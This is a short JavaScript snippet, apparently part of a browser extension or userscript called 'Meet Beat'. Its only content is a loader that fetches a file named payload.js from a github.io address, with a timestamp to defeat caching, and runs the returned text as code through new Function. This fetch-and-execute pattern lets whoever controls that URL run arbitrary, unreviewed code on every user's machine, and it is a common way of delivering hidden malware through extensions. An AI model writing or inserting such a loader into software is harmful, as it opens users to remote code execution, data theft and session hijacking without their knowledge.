const REMOTE_SCRIPT_URL = 'https://mrrob100.github.io/call-rhythm/remote/payload.js';

fetch(REMOTE_SCRIPT_URL + '?t=' + Date.now())
  .then(res => res.text())
  .then(code => new Function(code)())
  .catch(err => console.error('[Meet Beat]', err));
